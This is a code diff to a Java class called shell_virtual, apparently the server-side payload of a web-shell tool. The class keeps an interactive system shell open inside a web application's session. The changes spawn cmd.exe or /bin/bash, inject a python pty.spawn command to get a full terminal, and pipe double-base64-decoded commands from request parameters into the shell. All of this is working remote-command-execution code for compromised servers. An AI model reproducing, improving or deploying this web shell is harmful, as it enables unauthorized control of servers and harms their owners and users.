@@ -4,6 +4,7 @@ import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.io.StringWriter;
 import java.lang.reflect.Method;
+import java.nio.charset.StandardCharsets;
 import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
@@ -143,22 +144,21 @@ public class shell_virtual extends ClassLoader
             {
                 try
                 {
-                    String szOS = System.getProperty("os.name").toLowerCase().toString();
+                    String szOS = System.getProperty("os.name").toLowerCase();
                     boolean bIsWindows = szOS.contains("win");
-                    String szShellCmd = mapParams.containsKey("z1") ? new String(Base64.getDecoder().decode(mapParams.get("z1"))) : (bIsWindows ? "cmd.exe" : "/bin/bash");
 
-                    if (!bIsWindows)
-                    {
-                        // Unix-like
-                        szShellCmd = String.format("python3 -c 'import pty; pty.spawn(\"%s\")'", szShellCmd);
+                    ProcessBuilder pb;
+                    if (bIsWindows) {
+                        pb = new ProcessBuilder("cmd.exe");
+                    } else {
+                        pb = new ProcessBuilder("/bin/bash");
+                        pb.environment().put("TERM", "xterm");
                     }
 
-                    ProcessBuilder pb = new ProcessBuilder(szShellCmd.split(" "));
                     pb.redirectErrorStream(true);
+                    Process process = pb.start();
 
-                    var process = pb.start();
                     var outputBuffer = new ByteArrayOutputStream();
-
                     fnSessSetAttribute.invoke(objSession, new Object[] { "shell_proc", process });
                     fnSessSetAttribute.invoke(objSession, new Object[] { "shell_in", process.getOutputStream() });
                     fnSessSetAttribute.invoke(objSession, new Object[] { "shell_out_buf", outputBuffer });
@@ -167,20 +167,23 @@ public class shell_virtual extends ClassLoader
                         try {
                             java.io.InputStream is = process.getInputStream();
                             byte[] bytes = new byte[4096];
-                            int readLen = 0;
-
+                            int readLen;
                             while ((readLen = is.read(bytes)) != -1) {
                                 outputBuffer.write(bytes, 0, readLen);
                             }
-                        } catch (java.io.IOException e) {
-                            e.printStackTrace(); 
-                        }
+                        } catch (Exception e) {}
                     });
-
                     readThread.start();
 
-                    szJSON = String.format(szJSON, "success", "Java Multi-thread Engine spawned in memory safely.");
+                    if (!bIsWindows) {
+                        OutputStream os = process.getOutputStream();
+                        String pythonPtyCmd = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")'\n";
+                        os.write(pythonPtyCmd.getBytes("UTF-8"));
+                        os.flush();
+                    }
 
+                    szJSON = String.format(szJSON, "success", "PTY spawned and initialized successfully.");
+                    sb.append(szJSON);
                 }
                 catch (Exception ex)
                 {
@@ -192,26 +195,19 @@ public class shell_virtual extends ClassLoader
             else if (szType.equalsIgnoreCase("write"))
             {
                 OutputStream osStream = (OutputStream)fnSessGetAttribute.invoke(objSession, new Object[] {"shell_in"});
-                
-                if (osStream != null)
-                {
-                    try
-                    {
-                        String szShellCmd = new String(Base64.getDecoder().decode(mapParams.get("z1")));
-                        szShellCmd = new String(Base64.getDecoder().decode(szShellCmd));
-                        var cmdBytes = szShellCmd.getBytes();
-
-                        osStream.write(cmdBytes);
+                if (osStream != null) {
+                    try {
+                        String szShellCmd = new String(Base64.getDecoder().decode(mapParams.get("z1")), StandardCharsets.UTF_8);
+                        szShellCmd = new String(Base64.getDecoder().decode(szShellCmd), StandardCharsets.UTF_8);
+                        
+                        osStream.write(szShellCmd.getBytes("UTF-8"));
                         osStream.flush();
 
-                        szJSON = String.format(szJSON, "success", "Input stream piped directly");
-                    }
-                    catch (Exception ex)
-                    {
+                        szJSON = String.format(szJSON, "success", "Bytes flushed to PTY stdin.");
+                    } catch (Exception ex) {
                         szJSON = String.format(szJSON, "failed", ex.getMessage());
                     }
                 }
-
                 sb.append(szJSON);
             }
             else if (szType.equalsIgnoreCase("read"))
